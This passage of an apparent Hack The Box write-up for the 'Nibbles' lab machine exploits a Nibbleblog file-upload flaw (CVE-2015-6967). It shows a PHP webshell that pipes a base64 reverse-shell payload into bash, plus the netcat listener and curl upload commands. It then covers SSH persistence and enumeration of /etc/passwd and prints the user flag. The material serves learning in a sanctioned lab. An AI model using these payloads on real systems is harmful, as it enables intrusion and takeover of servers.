+<p>Anyways, now that we're logged in, we get access to new a new page.</p>
+<p><img src="https://mmezirard.github.io/htb-write-ups/boxes/nibbles/apache-nibbleblog-admin-page-dashboard.png" alt="Apache nibbleblog admin page dashboard" /></p>
+<p>It's a dashboard to manage the blog.</p>
+<p>We have access to various functionalities, including publishing or managing blog
+posts. We can also edit the themes and plugins, but I don't see how to get a
+foothold using these functionalities.</p>
+<h4 id="known-vulnerabilities">Known vulnerabilities</h4>
+<p>If we search <a href="https://www.exploit-db.com/">ExploitDB</a> for <code>Nibbleblog 4.0.3</code>, we
+find
+<a href="https://www.exploit-db.com/exploits/38489">Nibbleblog 4.0.3 - Arbitrary File Upload (Metasploit)</a>
+(<a href="https://nvd.nist.gov/vuln/detail/CVE-2015-6967">CVE-2015-6967</a>).</p>
+<h2 id="foothold-cve-2015-6967">Foothold (<a href="https://nvd.nist.gov/vuln/detail/CVE-2015-6967">CVE-2015-6967</a>)</h2>
+<p><a href="https://nvd.nist.gov/vuln/detail/CVE-2015-6967">CVE-2015-6967</a> is a
+vulnerability affecting Nibbleblog versions prior to <code>4.0.5</code>. An authenticated
+attacker can utilize the 'My image' plugin to upload a file with an executable
+extension like PHP, and then execute it by sending a request to
+<code>/content/private/plugins/my_image/image.php</code>. This effectively grants the
+attacker RCE.</p>
+<h3 id="checks">Checks</h3>
+<p>This exploit requires the 'My image' plugin to be installed. Let's check if it
+is:</p>
+<p><img src="https://mmezirard.github.io/htb-write-ups/boxes/nibbles/apache-nibbleblog-admin-plugins-page.png" alt="Apache nibbleblog admin plugins page" /></p>
+<p>We see that it's indeed installed.</p>
+<h3 id="preparation">Preparation</h3>
+<p>The Metasploit module <code>exploit/multi/http/nibbleblog_file_upload</code> can be used to
+exploit this vulnerability, but it's not too hard to do manually.</p>
+<p>The goal is to obtain a reverse shell.</p>
+<p>First, I'll setup a listener to receive the shell.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">❯</span></span><span class="z-meta z-function-call z-arguments z-shell"> rlwrap nc<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>lvnp</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>9001<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span></span>
+</span></code></pre>
+<p>Then, I'll choose the Base64 encoded version of the 'Bash -i' payload from
+<a href="https://www.revshells.com/">RevShells</a> configured to obtain a <code>/bin/bash</code>
+shell.</p>
+<p>We still need to find a way to execute our payload. Luckily we know that the
+website is using PHP, so it should be pretty easy to obtain one by executing our
+payload as an OS command like that:</p>
+<pre data-lang="php" class="language-php z-code"><code class="language-php" data-lang="php"><span class="z-embedding z-php"><span class="z-text z-html z-basic"><span class="z-meta z-embedded z-line z-php"><span class="z-punctuation z-section z-embedded z-begin z-php">&lt;?php</span></span><span class="z-meta z-embedded z-line z-php"><span class="z-source z-php"> <span class="z-meta z-function-call z-php"><span class="z-support z-function z-exec z-php">system</span></span><span class="z-meta z-function-call z-php"><span class="z-meta z-group z-php"><span class="z-punctuation z-section z-group z-begin z-php">(</span></span></span><span class="z-meta z-function-call z-php"><span class="z-meta z-group z-php"><span class="z-string z-quoted z-single z-php"><span class="z-punctuation z-definition z-string z-begin z-php">&#39;</span></span><span class="z-string z-quoted z-single z-php"><span class="z-meta z-string-contents z-quoted z-single z-php"></span></span><span class="z-string z-quoted z-single z-php"><span class="z-meta z-string-contents z-quoted z-single z-php">/bin/echo &lt;BASE64_REVSHELL_PAYLOAD&gt; | /usr/bin/base64 -d | /bin/bash -i</span><span class="z-punctuation z-definition z-string z-end z-php">&#39;</span></span><span class="z-meta z-function-call z-php"><span class="z-meta z-group z-php"><span class="z-punctuation z-section z-group z-end z-php">)</span></span></span></span></span> </span><span class="z-punctuation z-section z-embedded z-end z-php">?&gt;</span><span class="z-meta z-html-newline-after-php z-php">
+</span></span></span></span></code></pre>
+<p>I'll save it as <code>revshell.php</code>.</p>
+<h3 id="exploitation">Exploitation</h3>
+<p>It's time to upload our <code>revshell.php</code> file. However, to do so, we need a
+<code>PHPSESSID</code> token.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">❯</span></span><span class="z-meta z-function-call z-arguments z-shell"> RESPONSE=<span class="z-meta z-group z-expansion z-command z-parens z-shell"><span class="z-punctuation z-definition z-variable z-shell">$</span><span class="z-punctuation z-section z-parens z-begin z-shell">(</span><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">curl</span></span><span class="z-meta z-function-call z-arguments z-shell"><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>s</span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>i</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>http://10.10.10.75/nibbleblog/admin.php?controller=user&amp;action=login<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>X</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>POST<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> --</span>data-urlencode</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>username=admin<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> --</span>data-urlencode</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>password=nibbles<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span></span><span class="z-punctuation z-section z-parens z-end z-shell">)</span></span></span><span class="z-keyword z-operator z-logical z-continue z-shell">;</span> <span class="z-punctuation z-separator z-continuation z-line z-shell">\
+</span></span><span class="z-source z-shell z-bash">  <span class="z-variable z-other z-readwrite z-assignment z-shell">PHPSESSID</span><span class="z-keyword z-operator z-assignment z-shell">=</span><span class="z-string z-unquoted z-shell"><span class="z-meta z-group z-expansion z-command z-parens z-shell"><span class="z-punctuation z-definition z-variable z-shell">$</span><span class="z-punctuation z-section z-parens z-begin z-shell">(</span><span class="z-meta z-function-call z-shell"><span class="z-support z-function z-echo z-shell">echo</span></span><span class="z-meta z-function-call z-arguments z-shell"> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span><span class="z-meta z-group z-expansion z-parameter z-shell"><span class="z-punctuation z-definition z-variable z-shell">$</span><span class="z-variable z-other z-readwrite z-shell">RESPONSE</span></span><span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span></span> <span class="z-keyword z-operator z-logical z-pipe z-shell">|</span> <span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">grep</span></span><span class="z-meta z-function-call z-arguments z-shell"><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>oP</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>Set-Cookie: PHPSESSID=\K[^;]+<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span></span><span class="z-punctuation z-section z-parens z-end z-shell">)</span></span></span>
+</span></code></pre>
+<p>With this value, we can upload our PHP file.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">❯</span></span><span class="z-meta z-function-call z-arguments z-shell"> curl<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>s</span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>o</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>/dev/null<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>H</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>Cookie: PHPSESSID=<span class="z-meta z-group z-expansion z-parameter z-shell"><span class="z-punctuation z-definition z-variable z-shell">$</span><span class="z-variable z-other z-readwrite z-shell">PHPSESSID</span></span><span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>http://10.10.10.75/nibbleblog/admin.php?controller=plugins&amp;action=config&amp;plugin=my_image<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>X</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>POST<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>F</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>plugin=my_image<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>F</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>title=Revshell<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>F</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>position=4<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>F</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>caption=Revshell<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>F</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>image=@/workspace/revshell.php;type=application/x-php<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>F</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>image_resize=1<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>F</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>image_width=230<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>F</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>image_height=200<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>F</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>image_option=auto<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span></span>
+</span></code></pre>
+<p>Finally, let's trigger our <code>revshell.php</code> file!</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">❯</span></span><span class="z-meta z-function-call z-arguments z-shell"> curl<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>s</span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>o</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>/dev/null<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>http://10.10.10.75/nibbleblog/content/private/plugins/my_image/image.php<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span></span>
+</span></code></pre>
+<p>And if we check our listener:</p>
+<pre class="z-code"><code><span class="z-text z-plain">connect to [10.10.14.5] from (UNKNOWN) [10.10.10.75] 41228
+</span><span class="z-text z-plain">&lt;SNIP&gt;
+</span><span class="z-text z-plain">nibbler@Nibbles:/var/www/html/nibbleblog/content/private/plugins/my_image$
+</span></code></pre>
+<p>It caught the reverse shell!</p>
+<h3 id="spawning-a-pty-establishing-persistence">Spawning a pty &amp; establishing persistence</h3>
+<p>Let's use SSH to spawn a pty and to establish persistence.</p>
+<p>Our home folder doesn't contain a <code>.ssh</code> folder, so I'll create one. Then I'll
+create a private key, and I'll add the corresponding public key to
+<code>authorized_keys</code>. Finally, I'll connect over SSH to Nibbles as <code>nibbler</code>.</p>
+<h2 id="getting-a-lay-of-the-land">Getting a lay of the land</h2>
+<p>If we run <code>whoami</code>, we see that we got a foothold as <code>nibbler</code>.</p>
+<h3 id="architecture">Architecture</h3>
+<p>What is Nibbles's architecture?</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">nibbler@Nibbles:<span class="z-meta z-group z-expansion z-tilde"><span class="z-variable z-language z-tilde z-shell">~</span></span>$</span></span><span class="z-meta z-function-call z-arguments z-shell"> uname<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>m</span></span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">x86_64
+</span></code></pre>
+<p>It's using x86_64. Let's keep that in mind to select the appropriate binaries.</p>
+<h3 id="distribution">Distribution</h3>
+<p>Let's see which distribution Nibbles is using.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">nibbler@Nibbles:<span class="z-meta z-group z-expansion z-tilde"><span class="z-variable z-language z-tilde z-shell">~</span></span>$</span></span><span class="z-meta z-function-call z-arguments z-shell"> cat <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>/etc/lsb-release<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span></span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">DISTRIB_ID=Ubuntu
+</span><span class="z-text z-plain">DISTRIB_RELEASE=16.04
+</span><span class="z-text z-plain">DISTRIB_CODENAME=xenial
+</span><span class="z-text z-plain">DISTRIB_DESCRIPTION=&quot;Ubuntu 16.04.3 LTS&quot;
+</span></code></pre>
+<p>Okay, so it's Ubuntu 16.04.</p>
+<h3 id="kernel">Kernel</h3>
+<p>Let's find the kernel version of Nibbles.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">nibbler@Nibbles:<span class="z-meta z-group z-expansion z-tilde"><span class="z-variable z-language z-tilde z-shell">~</span></span>$</span></span><span class="z-meta z-function-call z-arguments z-shell"> uname<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>r</span></span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">4.4.0-104-generic
+</span></code></pre>
+<p>It's <code>4.4.0</code>.</p>
+<h3 id="users">Users</h3>
+<p>Let's enumerate all users.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">nibbler@Nibbles:<span class="z-meta z-group z-expansion z-tilde"><span class="z-variable z-language z-tilde z-shell">~</span></span>$</span></span><span class="z-meta z-function-call z-arguments z-shell"> grep <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>.*sh$<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>/etc/passwd<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span></span> <span class="z-keyword z-operator z-logical z-pipe z-shell">|</span> <span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">cut</span></span><span class="z-meta z-function-call z-arguments z-shell"><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>d</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>:<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>f</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>1<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span></span> <span class="z-keyword z-operator z-logical z-pipe z-shell">|</span> <span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">sort</span></span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">root
+</span></code></pre>
+<p>There's only <code>root</code>.</p>
+<h3 id="groups">Groups</h3>
+<p>Let's enumerate all groups.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">nibbler@Nibbles:<span class="z-meta z-group z-expansion z-tilde"><span class="z-variable z-language z-tilde z-shell">~</span></span>$</span></span><span class="z-meta z-function-call z-arguments z-shell"> cat <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>/etc/group<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span></span> <span class="z-keyword z-operator z-logical z-pipe z-shell">|</span> <span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">cut</span></span><span class="z-meta z-function-call z-arguments z-shell"><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>d</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>:<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>f</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>1<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span></span> <span class="z-keyword z-operator z-logical z-pipe z-shell">|</span> <span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">sort</span></span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">adm
+</span><span class="z-text z-plain">audio
+</span><span class="z-text z-plain">backup
+</span><span class="z-text z-plain">bin
+</span><span class="z-text z-plain">cdrom
+</span><span class="z-text z-plain">crontab
+</span><span class="z-text z-plain">daemon
+</span><span class="z-text z-plain">dialout
+</span><span class="z-text z-plain">dip
+</span><span class="z-text z-plain">disk
+</span><span class="z-text z-plain">fax
+</span><span class="z-text z-plain">floppy
+</span><span class="z-text z-plain">games
+</span><span class="z-text z-plain">gnats
+</span><span class="z-text z-plain">input
+</span><span class="z-text z-plain">irc
+</span><span class="z-text z-plain">kmem
+</span><span class="z-text z-plain">list
+</span><span class="z-text z-plain">lp
+</span><span class="z-text z-plain">lpadmin
+</span><span class="z-text z-plain">lxd
+</span><span class="z-text z-plain">mail
+</span><span class="z-text z-plain">man
+</span><span class="z-text z-plain">messagebus
+</span><span class="z-text z-plain">mlocate
+</span><span class="z-text z-plain">mysql
+</span><span class="z-text z-plain">netdev
+</span><span class="z-text z-plain">news
+</span><span class="z-text z-plain">nibbler
+</span><span class="z-text z-plain">nogroup
+</span><span class="z-text z-plain">operator
+</span><span class="z-text z-plain">plugdev
+</span><span class="z-text z-plain">proxy
+</span><span class="z-text z-plain">root
+</span><span class="z-text z-plain">sambashare
+</span><span class="z-text z-plain">sasl
+</span><span class="z-text z-plain">shadow
+</span><span class="z-text z-plain">src
+</span><span class="z-text z-plain">ssh
+</span><span class="z-text z-plain">ssl-cert
+</span><span class="z-text z-plain">staff
+</span><span class="z-text z-plain">sudo
+</span><span class="z-text z-plain">sys
+</span><span class="z-text z-plain">syslog
+</span><span class="z-text z-plain">systemd-bus-proxy
+</span><span class="z-text z-plain">systemd-journal
+</span><span class="z-text z-plain">systemd-network
+</span><span class="z-text z-plain">systemd-resolve
+</span><span class="z-text z-plain">systemd-timesync
+</span><span class="z-text z-plain">tape
+</span><span class="z-text z-plain">tty
+</span><span class="z-text z-plain">users
+</span><span class="z-text z-plain">utmp
+</span><span class="z-text z-plain">uucp
+</span><span class="z-text z-plain">uuidd
+</span><span class="z-text z-plain">video
+</span><span class="z-text z-plain">voice
+</span><span class="z-text z-plain">www-data
+</span></code></pre>
+<p>The <code>lxd</code> group is interesting to elevate privileges.</p>
+<h3 id="nics">NICs</h3>
+<p>Let's gather the list of connected NICs.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">nibbler@Nibbles:<span class="z-meta z-group z-expansion z-tilde"><span class="z-variable z-language z-tilde z-shell">~</span></span>$</span></span><span class="z-meta z-function-call z-arguments z-shell"> ifconfig</span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">ens192    Link encap:Ethernet  HWaddr 00:50:56:b9:91:f9  
+</span><span class="z-text z-plain">          inet addr:10.10.10.75  Bcast:10.10.10.255  Mask:255.255.255.0
+</span><span class="z-text z-plain">          inet6 addr: dead:beef::250:56ff:feb9:91f9/64 Scope:Global
+</span><span class="z-text z-plain">          inet6 addr: fe80::250:56ff:feb9:91f9/64 Scope:Link
+</span><span class="z-text z-plain">          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
+</span><span class="z-text z-plain">          RX packets:853 errors:0 dropped:23 overruns:0 frame:0
+</span><span class="z-text z-plain">          TX packets:1203 errors:0 dropped:0 overruns:0 carrier:0
+</span><span class="z-text z-plain">          collisions:0 txqueuelen:1000 
+</span><span class="z-text z-plain">          RX bytes:112844 (112.8 KB)  TX bytes:194623 (194.6 KB)
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">lo        Link encap:Local Loopback  
+</span><span class="z-text z-plain">          inet addr:127.0.0.1  Mask:255.0.0.0
+</span><span class="z-text z-plain">          inet6 addr: ::1/128 Scope:Host
+</span><span class="z-text z-plain">          UP LOOPBACK RUNNING  MTU:65536  Metric:1
+</span><span class="z-text z-plain">          RX packets:160 errors:0 dropped:0 overruns:0 frame:0
+</span><span class="z-text z-plain">          TX packets:160 errors:0 dropped:0 overruns:0 carrier:0
+</span><span class="z-text z-plain">          collisions:0 txqueuelen:1 
+</span><span class="z-text z-plain">          RX bytes:11840 (11.8 KB)  TX bytes:11840 (11.8 KB)
+</span></code></pre>
+<p>There's an Ethernet interface and the loopback interface.</p>
+<h3 id="hostname">Hostname</h3>
+<p>What is Nibbles's hostname?</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">nibbler@Nibbles:<span class="z-meta z-group z-expansion z-tilde"><span class="z-variable z-language z-tilde z-shell">~</span></span>$</span></span><span class="z-meta z-function-call z-arguments z-shell"> hostname</span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">Nibbles
+</span></code></pre>
+<p>Yeah I know, very surprising.</p>
+<h2 id="system-enumeration">System enumeration</h2>
+<h3 id="flags">Flags</h3>
+<p>If we check our home folder, we find the user flag.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">nibbler@Nibbles:<span class="z-meta z-group z-expansion z-tilde"><span class="z-variable z-language z-tilde z-shell">~</span></span>$</span></span><span class="z-meta z-function-call z-arguments z-shell"> cat <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>/home/nibbler/user.txt<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span></span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">776d2a7bd5bb06164ac5545d577f73cc
+</span></code></pre>
+<h3 id="home-folders">Home folders</h3>
+<p>If we explore our home folder, we notice a <code>personal.zip</code> file.</p>
+<h3 id="inspecting-home-nibbler-personal-zip">Inspecting <code>/home/nibbler/personal.zip</code></h3>
+<p>Let's get the content of this mysterious file:</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">nibbler@Nibbles:<span class="z-meta z-group z-expansion z-tilde"><span class="z-variable z-language z-tilde z-shell">~</span></span>$</span></span><span class="z-meta z-function-call z-arguments z-shell"> unzip<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>l</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>/home/nibbler/personal.zip<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span></span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">Archive:  /home/nibbler/personal.zip
+</span><span class="z-text z-plain">  Length      Date    Time    Name
+</span><span class="z-text z-plain">---------  ---------- -----   ----
+</span><span class="z-text z-plain">        0  2017-12-10 21:58   personal/
+</span><span class="z-text z-plain">        0  2017-12-10 22:05   personal/stuff/
+</span><span class="z-text z-plain">     4015  2015-05-08 03:17   personal/stuff/monitor.sh
+</span><span class="z-text z-plain">---------                     -------
+</span><span class="z-text z-plain">     4015                     3 files
+</span></code></pre>
+<p>Okay, so it contains a <code>monitor.sh</code> file. Let's unzip it now:</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">nibbler@Nibbles:<span class="z-meta z-group z-expansion z-tilde"><span class="z-variable z-language z-tilde z-shell">~</span></span>$</span></span><span class="z-meta z-function-call z-arguments z-shell"> unzip <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>/home/nibbler/personal.zip<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>d</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>/tmp<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span></span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">Archive:  /home/nibbler/personal.zip
+</span><span class="z-text z-plain">   creating: /tmp/personal/
+</span><span class="z-text z-plain">   creating: /tmp/personal/stuff/
+</span><span class="z-text z-plain">  inflating: /tmp/personal/stuff/monitor.sh
+</span></code></pre>
+<h3 id="inspecting-tmp-personal-stuff-monitor-sh">Inspecting <code>/tmp/personal/stuff/monitor.sh</code></h3>
+<p>Now let's inspect the <code>monitor.sh</code> file we just obtained from the ZIP archive.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-keyword z-operator z-assignment z-redirection z-shell">&lt;</span>SNIP<span class="z-keyword z-operator z-assignment z-redirection z-shell">&gt;</span>
+</span><span class="z-source z-shell z-bash">                  <span class="z-comment z-line z-number-sign z-shell"><span class="z-punctuation z-definition z-comment z-begin z-shell">#</span></span><span class="z-comment z-line z-number-sign z-shell">###################################################################################################</span><span class="z-comment z-line z-number-sign z-shell">
+</span></span><span class="z-source z-shell z-bash">                  <span class="z-comment z-line z-number-sign z-shell"><span class="z-punctuation z-definition z-comment z-begin z-shell">#</span></span><span class="z-comment z-line z-number-sign z-shell">                                        Tecmint_monitor.sh                                        #</span><span class="z-comment z-line z-number-sign z-shell">
+</span></span><span class="z-source z-shell z-bash">                  <span class="z-comment z-line z-number-sign z-shell"><span class="z-punctuation z-definition z-comment z-begin z-shell">#</span></span><span class="z-comment z-line z-number-sign z-shell"> Written for Tecmint.com for the post www.tecmint.com/linux-server-health-monitoring-script/      #</span><span class="z-comment z-line z-number-sign z-shell">
